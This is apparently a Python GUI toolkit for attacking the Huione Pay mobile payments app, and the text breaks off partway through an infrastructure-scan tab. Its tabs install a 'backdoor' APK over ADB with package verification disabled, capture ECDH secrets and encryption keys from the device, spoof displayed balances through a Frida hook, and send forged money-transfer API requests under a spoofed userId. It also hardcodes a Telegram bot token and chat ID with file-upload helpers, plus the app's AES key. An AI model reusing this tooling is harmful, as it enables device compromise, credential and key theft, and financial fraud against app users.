#!/usr/bin/env python3
"""
 Dashboard v1.0
===================================

Features:
  Tab 1: Deploy Backdoor APK 
  Tab 2: Balance Spoof 
  Tab 3: Transfer Spoof 
  Tab 4: Live Capture 
  Tab 5: AES Decrypt 
  Tab 6: Infrastructure Scan
  Tab 7: Device Spoof 

Chay: python HUIONE_DASHBOARD.py
      hoac double-click file nay
"""

import base64
import json
import os
import subprocess
import sys
import threading
import time
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, filedialog
from datetime import datetime
from urllib.parse import quote, unquote

# ============================================================
# PATHS & CONFIG
# ============================================================
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
TOOLKIT_DIR = os.path.join(os.path.dirname(SCRIPT_DIR), "huione-srouce", "huiwang", "toolkit")
if not os.path.isdir(TOOLKIT_DIR):
    TOOLKIT_DIR = SCRIPT_DIR

# Try to find ADB
ADB_PATHS = [
    os.path.expandvars(r"%LOCALAPPDATA%\Android\Sdk\platform-tools\adb.exe"),
    r"C:\Users\2\AppData\Local\Android\Sdk\platform-tools\adb.exe",
    "adb",
]
ADB = None
for p in ADB_PATHS:
    if os.path.isfile(p):
        ADB = p
        break
if ADB is None:
    ADB = "adb"

# APK paths to search
APK_SEARCH_PATHS = [
    os.path.join(SCRIPT_DIR, "huione_backdoor_signed.apk"),
    os.path.join(TOOLKIT_DIR, "dumps", "redmi6a", "huione_backdoor_signed.apk"),
    os.path.join(os.path.expanduser("~"), "Desktop", "huione_backdoor_signed.apk"),
]

# Telegram Bot
TG_BOT_TOKEN = "8232108172:AAECljjM2N2fkc8pauo4lz6LY0QQlBUljXU"
TG_CHAT_ID = "5466226261"
TG_API = f"https://api.telegram.org/bot{TG_BOT_TOKEN}"

# AES Key
HUIONE_AES_KEY = b"keyhead_project_xhui_one_keytail"

# Try import crypto
HAS_CRYPTO = False
try:
    from Crypto.Cipher import AES
    HAS_CRYPTO = True
except ImportError:
    try:
        from Cryptodome.Cipher import AES
        HAS_CRYPTO = True
    except ImportError:
        pass

# ============================================================
# STYLE — Dark theme
# ============================================================
BG = "#0f0f1a"
BG2 = "#1a1a2e"
BG3 = "#252545"
FG = "#e0e0ff"
FG2 = "#8888aa"
ACCENT = "#00d4ff"
GREEN = "#00ff88"
RED = "#ff4466"
YELLOW = "#ffcc00"
ORANGE = "#ff8844"
PURPLE = "#aa66ff"

FONT = ("Segoe UI", 10)
FONT_BOLD = ("Segoe UI", 10, "bold")
FONT_BIG = ("Segoe UI", 13, "bold")
FONT_TITLE = ("Segoe UI", 18, "bold")
FONT_MONO = ("Consolas", 10)
FONT_MONO_SM = ("Consolas", 9)


# ============================================================
# HELPERS
# ============================================================
def run_cmd(cmd, timeout=60):
    """Run a shell command and return (returncode, stdout, stderr)."""
    try:
        r = subprocess.run(
            cmd, shell=True, capture_output=True, text=True,
            timeout=timeout, encoding="utf-8", errors="replace"
        )
        return r.returncode, r.stdout.strip(), r.stderr.strip()
    except subprocess.TimeoutExpired:
        return -1, "", "TIMEOUT"
    except Exception as e:
        return -1, "", str(e)


def adb_cmd(args, timeout=30):
    """Run ADB command."""
    cmd = f'"{ADB}" {args}'
    return run_cmd(cmd, timeout)


def find_apk():
    """Find the backdoor APK."""
    for p in APK_SEARCH_PATHS:
        if os.path.isfile(p):
            return p
    return None


def tg_send_message(text, parse_mode="HTML"):
    """Send text message via Telegram bot."""
    import urllib.request, urllib.parse
    try:
        # Truncate to 4096 chars (Telegram limit)
        if len(text) > 4000:
            text = text[:4000] + "\n...(truncated)"
        data = urllib.parse.urlencode({
            "chat_id": TG_CHAT_ID,
            "text": text,
            "parse_mode": parse_mode,
        }).encode()
        req = urllib.request.Request(f"{TG_API}/sendMessage", data=data)
        with urllib.request.urlopen(req, timeout=30) as resp:
            return json.loads(resp.read())
    except Exception as e:
        return {"ok": False, "error": str(e)}


def tg_send_document(filepath, caption=""):
    """Send file via Telegram bot."""
    import urllib.request
    if not os.path.isfile(filepath):
        return {"ok": False, "error": "file not found"}
    # Max 50MB for bot API
    if os.path.getsize(filepath) > 50 * 1024 * 1024:
        return {"ok": False, "error": "file too large (>50MB)"}
    try:
        boundary = "----TgBoundary" + str(int(time.time()))
        body = b""
        # chat_id
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n{TG_CHAT_ID}\r\n".encode()
        # caption
        if caption:
            body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n{caption[:1024]}\r\n".encode()
        # file
        fname = os.path.basename(filepath)
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{fname}\"\r\nContent-Type: application/octet-stream\r\n\r\n".encode()
        with open(filepath, "rb") as f:
            body += f.read()
        body += f"\r\n--{boundary}--\r\n".encode()
        req = urllib.request.Request(
            f"{TG_API}/sendDocument", data=body,
            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"}
        )
        with urllib.request.urlopen(req, timeout=120) as resp:
            return json.loads(resp.read())
    except Exception as e:
        return {"ok": False, "error": str(e)}


def tg_send_photo(filepath, caption=""):
    """Send photo via Telegram bot."""
    import urllib.request
    if not os.path.isfile(filepath):
        return {"ok": False, "error": "file not found"}
    try:
        boundary = "----TgBoundary" + str(int(time.time()))
        body = b""
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n{TG_CHAT_ID}\r\n".encode()
        if caption:
            body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n{caption[:1024]}\r\n".encode()
        fname = os.path.basename(filepath)
        ct = "image/jpeg"
        if fname.endswith(".png"):
            ct = "image/png"
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"photo\"; filename=\"{fname}\"\r\nContent-Type: {ct}\r\n\r\n".encode()
        with open(filepath, "rb") as f:
            body += f.read()
        body += f"\r\n--{boundary}--\r\n".encode()
        req = urllib.request.Request(
            f"{TG_API}/sendPhoto", data=body,
            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"}
        )
        with urllib.request.urlopen(req, timeout=60) as resp:
            return json.loads(resp.read())
    except Exception as e:
        return {"ok": False, "error": str(e)}


def decrypt_aes_ecb(ciphertext_b64):
    """Decrypt Layer 4 AES-256-ECB."""
    if not HAS_CRYPTO:
        return "[ERROR: pip install pycryptodome]"
    try:
        raw = base64.b64decode(ciphertext_b64)
        cipher = AES.new(HUIONE_AES_KEY, AES.MODE_ECB)
        decrypted = cipher.decrypt(raw)
        pad_len = decrypted[-1]
        if pad_len > 16 or pad_len == 0:
            return "[PADDING ERROR]"
        plaintext = decrypted[:-pad_len]
        return unquote(plaintext.decode("utf-8"))
    except Exception as e:
        return f"[ERROR: {e}]"


def encrypt_aes_ecb(plaintext):
    """Encrypt with Layer 4 AES-256-ECB."""
    if not HAS_CRYPTO:
        return "[ERROR: pip install pycryptodome]"
    try:
        encoded = quote(plaintext).encode("utf-8")
        pad_len = 16 - (len(encoded) % 16)
        padded = encoded + bytes([pad_len] * pad_len)
        cipher = AES.new(HUIONE_AES_KEY, AES.MODE_ECB)
        encrypted = cipher.encrypt(padded)
        return base64.b64encode(encrypted).decode("ascii")
    except Exception as e:
        return f"[ERROR: {e}]"


# ============================================================
# THEMED WIDGETS
# ============================================================
class ThemedButton(tk.Button):
    def __init__(self, parent, text="", command=None, color=ACCENT, **kw):
        super().__init__(
            parent, text=text, command=command,
            bg=color, fg="#000000" if color != RED else "#ffffff",
            activebackground=GREEN, activeforeground="#000000",
            font=FONT_BOLD, relief="flat", cursor="hand2",
            padx=15, pady=8, **kw
        )

    def set_color(self, color):
        self.configure(bg=color)


class ThemedLabel(tk.Label):
    def __init__(self, parent, text="", **kw):
        font = kw.pop("font", FONT)
        fg = kw.pop("fg", FG)
        super().__init__(parent, text=text, bg=BG2, fg=fg, font=font, **kw)


class ThemedEntry(tk.Entry):
    def __init__(self, parent, **kw):
        super().__init__(
            parent, bg=BG3, fg=FG, insertbackground=ACCENT,
            font=FONT_MONO, relief="flat", **kw
        )


class LogBox(scrolledtext.ScrolledText):
    def __init__(self, parent, **kw):
        super().__init__(
            parent, bg="#0a0a15", fg=GREEN, insertbackground=GREEN,
            font=FONT_MONO_SM, relief="flat", state="disabled",
            wrap="word", **kw
        )

    def log(self, msg, tag=None):
        self.configure(state="normal")
        ts = datetime.now().strftime("%H:%M:%S")
        self.insert("end", f"[{ts}] {msg}\n", tag)
        self.see("end")
        self.configure(state="disabled")

    def log_color(self, msg, color):
        tag = f"color_{color}"
        self.tag_configure(tag, foreground=color)
        self.log(msg, tag)

    def clear(self):
        self.configure(state="normal")
        self.delete("1.0", "end")
        self.configure(state="disabled")


# ============================================================
# TAB 1: DEPLOY BACKDOOR
# ============================================================
class DeployTab(tk.Frame):
    def __init__(self, parent):
        super().__init__(parent, bg=BG2)
        self.build_ui()

    def build_ui(self):
        # Title
        tk.Label(self, text="DEPLOY BACKDOOR APK",
                 font=FONT_BIG, bg=BG2, fg=RED).pack(pady=(15, 5))
        tk.Label(self, text="Cai APK da tiem backdoor len dien thoai — bat ECDH secret + encrypt key + SDK decrypt",
                 font=FONT, bg=BG2, fg=FG2).pack(pady=(0, 10))

        # Status frame
        sf = tk.Frame(self, bg=BG2)
        sf.pack(fill="x", padx=20, pady=5)

        self.lbl_device = ThemedLabel(sf, text="Dien thoai: Chua kiem tra", fg=YELLOW)
        self.lbl_device.pack(anchor="w", pady=2)
        self.lbl_apk = ThemedLabel(sf, text="APK: Dang tim...", fg=YELLOW)
        self.lbl_apk.pack(anchor="w", pady=2)

        # Buttons
        bf = tk.Frame(self, bg=BG2)
        bf.pack(fill="x", padx=20, pady=10)

        ThemedButton(bf, text="1. Kiem tra dien thoai",
                     command=self.check_device, color=ACCENT).pack(side="left", padx=5)
        ThemedButton(bf, text="2. Go app cu",
                     command=self.uninstall, color=ORANGE).pack(side="left", padx=5)
        ThemedButton(bf, text="3. Cai backdoor APK",
                     command=self.install, color=RED).pack(side="left", padx=5)
        ThemedButton(bf, text="4. Cap quyen",
                     command=self.grant_perms, color=PURPLE).pack(side="left", padx=5)
        ThemedButton(bf, text="CHAY TAT CA (1-click)",
                     command=self.deploy_all, color=GREEN).pack(side="left", padx=15)

        # APK file selector
        af = tk.Frame(self, bg=BG2)
        af.pack(fill="x", padx=20, pady=5)
        tk.Label(af, text="APK file:", bg=BG2, fg=FG, font=FONT).pack(side="left")
        self.apk_var = tk.StringVar(value=find_apk() or "")
        ThemedEntry(af, textvariable=self.apk_var, width=70).pack(side="left", padx=5)
        ThemedButton(af, text="Chon...", command=self.browse_apk, color=BG3).pack(side="left")

        # Log
        self.log = LogBox(self, height=18)
        self.log.pack(fill="both", expand=True, padx=20, pady=10)

        # Auto-find APK
        apk = find_apk()
        if apk:
            self.lbl_apk.configure(text=f"APK: {os.path.basename(apk)} ({os.path.getsize(apk)//1024//1024}MB)", fg=GREEN)

    def browse_apk(self):
        f = filedialog.askopenfilename(filetypes=[("APK files", "*.apk")])
        if f:
            self.apk_var.set(f)
            sz = os.path.getsize(f) // 1024 // 1024
            self.lbl_apk.configure(text=f"APK: {os.path.basename(f)} ({sz}MB)", fg=GREEN)

    def _run_in_thread(self, func):
        threading.Thread(target=func, daemon=True).start()

    def check_device(self):
        self._run_in_thread(self._check_device)

    def _check_device(self):
        self.log.log("Kiem tra ket noi USB...")
        code, out, err = adb_cmd("devices")
        lines = [l for l in out.split("\n") if "\tdevice" in l]
        if lines:
            dev_id = lines[0].split("\t")[0]
            self.lbl_device.configure(text=f"Dien thoai: {dev_id} (KET NOI OK)", fg=GREEN)
            self.log.log_color(f"Tim thay thiet bi: {dev_id}", GREEN)

            # Get device info
            _, model, _ = adb_cmd("shell getprop ro.product.model")
            _, android, _ = adb_cmd("shell getprop ro.build.version.release")
            self.log.log(f"  Model: {model}")
            self.log.log(f"  Android: {android}")
        else:
            self.lbl_device.configure(text="Dien thoai: KHONG TIM THAY", fg=RED)
            self.log.log_color("Khong tim thay thiet bi! Cam USB va bat USB Debugging.", RED)

    def uninstall(self):
        self._run_in_thread(self._uninstall)

    def _uninstall(self):
        self.log.log("Go cai com.huione.pay...")
        # MIUI bypass
        adb_cmd("shell settings put secure install_non_market_apps 1")
        adb_cmd("shell settings put global package_verifier_enable 0")
        self.log.log("MIUI bypass: OK")

        code, out, err = adb_cmd("uninstall com.huione.pay", timeout=30)
        if code == 0:
            self.log.log_color("Go thanh cong!", GREEN)
        else:
            self.log.log_color(f"Go that bai (co the chua cai): {err}", YELLOW)

    def install(self):
        self._run_in_thread(self._install)

    def _install(self):
        apk = self.apk_var.get()
        if not apk or not os.path.isfile(apk):
            self.log.log_color("Chua chon file APK!", RED)
            return

        sz = os.path.getsize(apk) // 1024 // 1024
        self.log.log(f"Dang push APK ({sz}MB) len dien thoai...")
        self.log.log("(Co the mat 2-5 phut, vui long cho...)")

        code, out, err = adb_cmd(f'push "{apk}" /data/local/tmp/backdoor.apk', timeout=600)
        if code != 0:
            self.log.log_color(f"Push that bai: {err}", RED)
            return
        self.log.log_color("Push thanh cong!", GREEN)

        self.log.log("Dang cai dat APK...")
        code, out, err = adb_cmd("shell pm install -r /data/local/tmp/backdoor.apk", timeout=120)
        if "Success" in out or code == 0:
            self.log.log_color("CAI DAT THANH CONG!", GREEN)
        else:
            self.log.log_color(f"Cai dat that bai: {out} {err}", RED)

    def grant_perms(self):
        self._run_in_thread(self._grant_perms)

    def _grant_perms(self):
        self.log.log("Cap quyen ghi file cho app...")
        adb_cmd("shell pm grant com.huione.pay android.permission.WRITE_EXTERNAL_STORAGE")
        adb_cmd("shell pm grant com.huione.pay android.permission.READ_EXTERNAL_STORAGE")
        self.log.log_color("Cap quyen xong!", GREEN)

    def deploy_all(self):
        self._run_in_thread(self._deploy_all)

    def _deploy_all(self):
        self.log.log_color("=== BAT DAU DEPLOY TU DONG ===", ACCENT)
        self._check_device()
        time.sleep(1)
        self._uninstall()
        time.sleep(1)
        self._install()
        time.sleep(1)
        self._grant_perms()
        self.log.log_color("=== DEPLOY HOAN TAT ===", GREEN)
        self.log.log("Mo app Huione Pay tren dien thoai va dang nhap binh thuong.")
        self.log.log("Chuyen qua tab 'Live Capture' de bat du lieu.")


# ============================================================
# TAB 2: BALANCE SPOOF
# ============================================================
class BalanceTab(tk.Frame):
    def __init__(self, parent):
        super().__init__(parent, bg=BG2)
        self.build_ui()

    def build_ui(self):
        tk.Label(self, text="BALANCE SPOOF",
                 font=FONT_BIG, bg=BG2, fg=ORANGE).pack(pady=(15, 5))
        tk.Label(self, text="Thay doi so du hien thi tren app — chi la hien thi, KHONG thay doi so du that",
                 font=FONT, bg=BG2, fg=FG2).pack(pady=(0, 10))

        # Config
        cf = tk.LabelFrame(self, text="Cau hinh", bg=BG2, fg=ACCENT, font=FONT_BOLD)
        cf.pack(fill="x", padx=20, pady=5)

        row1 = tk.Frame(cf, bg=BG2)
        row1.pack(fill="x", padx=10, pady=5)
        tk.Label(row1, text="So du muon hien:", bg=BG2, fg=FG, font=FONT).pack(side="left")
        self.balance_var = tk.StringVar(value="999,888.77")
        ThemedEntry(row1, textvariable=self.balance_var, width=20).pack(side="left", padx=10)
        tk.Label(row1, text="USDT", bg=BG2, fg=YELLOW, font=FONT_BOLD).pack(side="left")

        row2 = tk.Frame(cf, bg=BG2)
        row2.pack(fill="x", padx=10, pady=5)
        tk.Label(row2, text="Cach hoat dong:", bg=BG2, fg=FG2, font=FONT).pack(side="left")
        tk.Label(row2, text="Hook read() tren libc.so → thay the so du trong API response truoc khi app doc",
                 bg=BG2, fg=FG2, font=FONT).pack(side="left", padx=10)

        # Buttons
        bf = tk.Frame(self, bg=BG2)
        bf.pack(fill="x", padx=20, pady=10)

        ThemedButton(bf, text="Kiem tra Frida",
                     command=self.check_frida, color=ACCENT).pack(side="left", padx=5)
        ThemedButton(bf, text="CHAY BALANCE SPOOF",
                     command=self.run_spoof, color=ORANGE).pack(side="left", padx=5)
        ThemedButton(bf, text="Dung",
                     command=self.stop_spoof, color=RED).pack(side="left", padx=5)

        self.log = LogBox(self, height=20)
        self.log.pack(fill="both", expand=True, padx=20, pady=10)
        self.frida_proc = None

    def check_frida(self):
        def _check():
            self.log.log("Kiem tra Frida server...")
            code, out, err = run_cmd("frida --version", timeout=10)
            if code == 0:
                self.log.log_color(f"Frida version: {out}", GREEN)
            else:
                self.log.log_color("Frida chua cai! Chay: pip install frida frida-tools", RED)

            code, out, err = adb_cmd("shell ls /data/local/tmp/frida-server*")
            if code == 0 and out:
                self.log.log(f"Frida server tren dien thoai: {out}")
            else:
                self.log.log_color("Khong tim thay frida-server tren dien thoai", YELLOW)
                self.log.log("Neu dung APK Frida Gadget thi khong can frida-server")
        threading.Thread(target=_check, daemon=True).start()

    def run_spoof(self):
        balance = self.balance_var.get().replace(",", "")
        self.log.log_color(f"Bat dau Balance Spoof: {balance} USDT", ORANGE)

        # Generate inline Frida script
        script = self._gen_balance_script(balance)
        script_path = os.path.join(SCRIPT_DIR, "_tmp_balance.js")
        with open(script_path, "w") as f:
            f.write(script)
        self.log.log(f"Script: {script_path}")
        self.log.log("Dang ket noi Frida...")
        self.log.log("(Neu dung Gadget: frida -H 127.0.0.1:27042 -n Gadget -l script.js)")

        def _run():
            try:
                self.frida_proc = subprocess.Popen(
                    f'frida -H 127.0.0.1:27042 -n Gadget -l "{script_path}"',
                    shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                    text=True, encoding="utf-8", errors="replace"
                )
                for line in self.frida_proc.stdout:
                    self.log.log(line.rstrip())
            except Exception as e:
                self.log.log_color(f"Loi: {e}", RED)
                self.log.log("Thu ket noi USB: frida -U -f com.huione.pay -l script.js")
        threading.Thread(target=_run, daemon=True).start()

    def stop_spoof(self):
        if self.frida_proc:
            self.frida_proc.kill()
            self.frida_proc = None
            self.log.log_color("Da dung Balance Spoof", YELLOW)

    def _gen_balance_script(self, balance):
        return f'''// Auto-generated Balance Spoof
'use strict';
var BALANCE = "{balance}";
var libc = Process.findModuleByName("libc.so");
var c_read = libc.findExportByName("read");
Interceptor.attach(c_read, {{
    onEnter: function(a) {{ this.fd = a[0].toInt32(); this.buf = a[1]; }},
    onLeave: function(r) {{
        var n = r.toInt32();
        if (n < 20 || n > 131072) return;
        try {{
            var data = this.buf.readUtf8String(n);
            if (data.indexOf('"balance"') !== -1 || data.indexOf('"availableAmount"') !== -1 ||
                data.indexOf('"totalWealth"') !== -1) {{
                var modified = data.replace(/"balance"\\s*:\\s*"[0-9.]+"/g, '"balance":"' + BALANCE + '"');
                modified = modified.replace(/"availableAmount"\\s*:\\s*"[0-9.]+"/g, '"availableAmount":"' + BALANCE + '"');
                modified = modified.replace(/"totalWealth"\\s*:\\s*"[0-9.]+"/g, '"totalWealth":"' + BALANCE + '"');
                if (modified !== data) {{
                    this.buf.writeUtf8String(modified);
                    r.replace(modified.length);
                    send("BALANCE_SPOOFED: " + BALANCE);
                }}
            }}
        }} catch(e) {{}}
    }}
}});
send("Balance Spoof active: " + BALANCE + " USDT");
'''


# ============================================================
# TAB 3: TRANSFER SPOOF
# ============================================================
class TransferTab(tk.Frame):
    def __init__(self, parent):
        super().__init__(parent, bg=BG2)
        self.build_ui()

    def build_ui(self):
        tk.Label(self, text="TRANSFER SPOOF",
                 font=FONT_BIG, bg=BG2, fg=RED).pack(pady=(15, 5))
        tk.Label(self, text="Gui request chuyen tien voi userId khac — can JWT token hop le",
                 font=FONT, bg=BG2, fg=FG2).pack(pady=(0, 10))

        # Config
        cf = tk.LabelFrame(self, text="Thong tin giao dich", bg=BG2, fg=ACCENT, font=FONT_BOLD)
        cf.pack(fill="x", padx=20, pady=5)

        fields = [
            ("JWT Token:", "token_var", "", 70),
            ("Server:", "server_var", "https://app.hh3721.com", 50),
            ("UserId gia mao:", "userid_var", "", 30),
            ("So dien thoai nhan:", "phone_var", "", 20),
            ("So tien:", "amount_var", "100", 15),
            ("Loai tien:", "currency_var", "USDT", 10),
            ("Mat khau giao dich (MD5):", "fundpw_var", "", 40),
        ]
        for label, var_name, default, width in fields:
            row = tk.Frame(cf, bg=BG2)
            row.pack(fill="x", padx=10, pady=2)
            tk.Label(row, text=label, bg=BG2, fg=FG, font=FONT, width=25, anchor="w").pack(side="left")
            var = tk.StringVar(value=default)
            setattr(self, var_name, var)
            ThemedEntry(row, textvariable=var, width=width).pack(side="left", padx=5, fill="x", expand=True)

        # Buttons
        bf = tk.Frame(self, bg=BG2)
        bf.pack(fill="x", padx=20, pady=10)

        ThemedButton(bf, text="Tao giao dich (createTransfer)",
                     command=self.create_transfer, color=RED).pack(side="left", padx=5)
        ThemedButton(bf, text="Kiem tra so du",
                     command=self.check_balance, color=ACCENT).pack(side="left", padx=5)
        ThemedButton(bf, text="Lay thong tin user",
                     command=self.get_userinfo, color=PURPLE).pack(side="left", padx=5)

        self.log = LogBox(self, height=16)
        self.log.pack(fill="both", expand=True, padx=20, pady=10)

    def _api_call(self, endpoint, data):
        """Make API call to Huione server."""
        token = self.token_var.get().strip()
        server = self.server_var.get().strip().rstrip("/")
        if not token:
            self.log.log_color("Chua nhap JWT Token!", RED)
            return None

        import urllib.request
        url = f"{server}/app{endpoint}"
        body = json.dumps(data).encode("utf-8")
        headers = {
            "Content-Type": "application/json",
            "Authorization": f"Bearer {token}",
            "Accept-Language": "vi",
        }
        try:
            req = urllib.request.Request(url, data=body, headers=headers, method="POST")
            import ssl
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with urllib.request.urlopen(req, context=ctx, timeout=30) as resp:
                return json.loads(resp.read().decode())
        except Exception as e:
            self.log.log_color(f"API Error: {e}", RED)
            return None

    def create_transfer(self):
        def _run():
            self.log.log_color("=== TAO GIAO DICH ===", RED)
            data = {
                "userId": self.userid_var.get().strip(),
                "toPhone": self.phone_var.get().strip(),
                "amount": self.amount_var.get().strip(),
                "currency": self.currency_var.get().strip(),
                "fundPassword": self.fundpw_var.get().strip(),
            }
            self.log.log(f"Request: {json.dumps(data, indent=2)}")
            resp = self._api_call("/foundation-server/foundation/trade/createTransfer", data)
            if resp:
                self.log.log_color(f"Response: {json.dumps(resp, indent=2, ensure_ascii=False)}", GREEN)
            else:
                self.log.log_color("Khong nhan duoc response", RED)
        threading.Thread(target=_run, daemon=True).start()

    def check_balance(self):
        def _run():
            self.log.log("Kiem tra so du...")
            resp = self._api_call("/foundation-server/foundation/account/wealth", {})
            if resp:
                self.log.log_color(f"So du: {json.dumps(resp, indent=2, ensure_ascii=False)}", GREEN)
        threading.Thread(target=_run, daemon=True).start()

    def get_userinfo(self):
        def _run():
            self.log.log("Lay thong tin user...")
            resp = self._api_call("/foundation-server/foundation/user/userInfo", {})
            if resp:
                self.log.log_color(f"User Info: {json.dumps(resp, indent=2, ensure_ascii=False)}", GREEN)
        threading.Thread(target=_run, daemon=True).start()


# ============================================================
# TAB 4: LIVE CAPTURE
# ============================================================
class CaptureTab(tk.Frame):
    def __init__(self, parent):
        super().__init__(parent, bg=BG2)
        self.capture_proc = None
        self.build_ui()

    def build_ui(self):
        tk.Label(self, text="LIVE CAPTURE",
                 font=FONT_BIG, bg=BG2, fg=GREEN).pack(pady=(15, 5))
        tk.Label(self, text="Bat ECDH secret + encrypt key + SDK decrypt tu backdoor APK (real-time qua Logcat)",
                 font=FONT, bg=BG2, fg=FG2).pack(pady=(0, 10))

        bf = tk.Frame(self, bg=BG2)
        bf.pack(fill="x", padx=20, pady=10)

        ThemedButton(bf, text="BAT DAU CAPTURE",
                     command=self.start_capture, color=GREEN).pack(side="left", padx=5)
        ThemedButton(bf, text="DUNG",
                     command=self.stop_capture, color=RED).pack(side="left", padx=5)
        ThemedButton(bf, text="Lay file log tu dien thoai",
                     command=self.pull_logs, color=ACCENT).pack(side="left", padx=5)
        ThemedButton(bf, text="Xoa log",
                     command=lambda: self.log.clear(), color=BG3).pack(side="left", padx=5)

        # Stats
        self.stats_var = tk.StringVar(value="ECDH: 0 | Encrypt: 0 | SDK Decrypt: 0")
        tk.Label(self, textvariable=self.stats_var, bg=BG2, fg=YELLOW, font=FONT_BOLD).pack(pady=5)

        self.log = LogBox(self, height=22)
        self.log.pack(fill="both", expand=True, padx=20, pady=10)

        self.ecdh_count = 0
        self.enc_count = 0
        self.sdk_count = 0

    def start_capture(self):
        if self.capture_proc:
            self.log.log_color("Dang capture roi!", YELLOW)
            return

        self.log.log_color("=== BAT DAU CAPTURE ===", GREEN)
        self.log.log("Dang cho du lieu tu backdoor APK...")
        self.log.log("Mo app Huione Pay tren dien thoai va thuc hien giao dich bat ky")
        self.log.log("")

        def _capture():
            try:
                # Clear logcat first
                adb_cmd("logcat -c")

                self.capture_proc = subprocess.Popen(
                    f'"{ADB}" logcat -s HUIONE_CAPTURE:E',
                    shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                    text=True, encoding="utf-8", errors="replace"
                )
                for line in self.capture_proc.stdout:
                    line = line.strip()
                    if not line or "-----" in line:
                        continue

                    if "ECDH|secret=" in line:
                        self.ecdh_count += 1
                        self.log.log_color(f"[ECDH SECRET] {line}", GREEN)
                    elif "ENC|key=" in line:
                        self.enc_count += 1
                        self.log.log_color(f"[ENCRYPT KEY] {line}", ORANGE)
                    elif "SDK_DEC|pt=" in line:
                        self.sdk_count += 1
                        self.log.log_color(f"[SDK DECRYPT] {line}", ACCENT)
                    else:
                        self.log.log(line)

                    self.stats_var.set(
                        f"ECDH: {self.ecdh_count} | Encrypt: {self.enc_count} | SDK Decrypt: {self.sdk_count}"
                    )
            except Exception as e:
                self.log.log_color(f"Loi: {e}", RED)
            finally:
                self.capture_proc = None

        threading.Thread(target=_capture, daemon=True).start()

    def stop_capture(self):
        if self.capture_proc:
            self.capture_proc.kill()
            self.capture_proc = None
            self.log.log_color("=== DA DUNG CAPTURE ===", YELLOW)

    def pull_logs(self):
        def _pull():
            self.log.log("Dang lay file log tu dien thoai...")
            save_dir = os.path.join(SCRIPT_DIR, "captured_logs")
            os.makedirs(save_dir, exist_ok=True)

            for f in ["huione_ecdh.log", "huione_encrypt.log", "huione_sdk.log"]:
                code, out, err = adb_cmd(f'pull /sdcard/{f} "{save_dir}/{f}"')
                if code == 0:
                    self.log.log_color(f"  Lay thanh cong: {f}", GREEN)
                else:
                    self.log.log_color(f"  Khong tim thay: {f}", YELLOW)

            self.log.log(f"Luu tai: {save_dir}")
        threading.Thread(target=_pull, daemon=True).start()


# ============================================================
# TAB 5: AES DECRYPT
# ============================================================
class DecryptTab(tk.Frame):
    def __init__(self, parent):
        super().__init__(parent, bg=BG2)
        self.build_ui()

    def build_ui(self):
        tk.Label(self, text="AES-256-ECB DECRYPT / ENCRYPT",
                 font=FONT_BIG, bg=BG2, fg=ACCENT).pack(pady=(15, 5))
        tk.Label(self, text=f"Key: keyhead_project_xhui_one_keytail (hardcoded trong app)",
                 font=FONT_MONO, bg=BG2, fg=FG2).pack(pady=(0, 10))

        # Input
        tk.Label(self, text="Nhap du lieu (Base64 de giai ma, hoac plaintext de ma hoa):",
                 bg=BG2, fg=FG, font=FONT).pack(anchor="w", padx=20)
        self.input_text = scrolledtext.ScrolledText(
            self, bg=BG3, fg=FG, font=FONT_MONO, height=6, wrap="word")
        self.input_text.pack(fill="x", padx=20, pady=5)

        # Buttons
        bf = tk.Frame(self, bg=BG2)
        bf.pack(fill="x", padx=20, pady=5)
        ThemedButton(bf, text="GIAI MA (Decrypt)", command=self.decrypt, color=GREEN).pack(side="left", padx=5)
        ThemedButton(bf, text="MA HOA (Encrypt)", command=self.encrypt, color=ORANGE).pack(side="left", padx=5)
        ThemedButton(bf, text="Xoa", command=self.clear, color=BG3).pack(side="left", padx=5)

        # Output
        tk.Label(self, text="Ket qua:", bg=BG2, fg=FG, font=FONT).pack(anchor="w", padx=20, pady=(10, 0))
        self.output_text = scrolledtext.ScrolledText(
            self, bg="#0a0a15", fg=GREEN, font=FONT_MONO, height=10, wrap="word")
        self.output_text.pack(fill="both", expand=True, padx=20, pady=(5, 10))

        if not HAS_CRYPTO:
            self.output_text.insert("1.0", "CANH BAO: Chua cai pycryptodome!\nChay: pip install pycryptodome\n")

    def decrypt(self):
        data = self.input_text.get("1.0", "end").strip()
        self.output_text.delete("1.0", "end")
        if not data:
            return
        for line in data.split("\n"):
            line = line.strip()
            if not line:
                continue
            result = decrypt_aes_ecb(line)
            self.output_text.insert("end", f"Input:  {line}\n")
            self.output_text.insert("end", f"Output: {result}\n\n")

    def encrypt(self):
        data = self.input_text.get("1.0", "end").strip()
        self.output_text.delete("1.0", "end")
        if not data:
            return
        result = encrypt_aes_ecb(data)
        self.output_text.insert("end", f"Input:  {data}\n")
        self.output_text.insert("end", f"Output: {result}\n")

    def clear(self):
        self.input_text.delete("1.0", "end")
        self.output_text.delete("1.0", "end")


# ============================================================
# TAB 6: INFRASTRUCTURE SCAN
# ============================================================
class InfraScanTab(tk.Frame):
    def __init__(self, parent):
        super().__init__(parent, bg=BG2)
        self.build_ui()

    def build_ui(self):
        tk.Label(self, text="INFRASTRUCTURE SCAN",
                 font=FONT_BIG, bg=BG2, fg=PURPLE).pack(pady=(15, 5))
        tk.Label(self, text="Kiem tra server Huione co dang hoat dong khong — tao bang chung phap ly",
                 font=FONT, bg=BG2, fg=FG2).pack(pady=(0, 10))

        bf = tk.Frame(self, bg=BG2)
        bf.pack(fill="x", padx=20, pady=10)
        ThemedButton(bf, text="SCAN TAT CA SERVER",
                     command=self.scan_all, color=PURPLE).pack(side="left", padx=5)
        ThemedButton(bf, text="Luu ket qua JSON",
                     command=self.save_results, color=ACCENT).pack(side="left", padx=5)

        self.log = LogBox(self, height=22)
        self.log.pack(fill="both", expand=True, padx=20, pady=10)
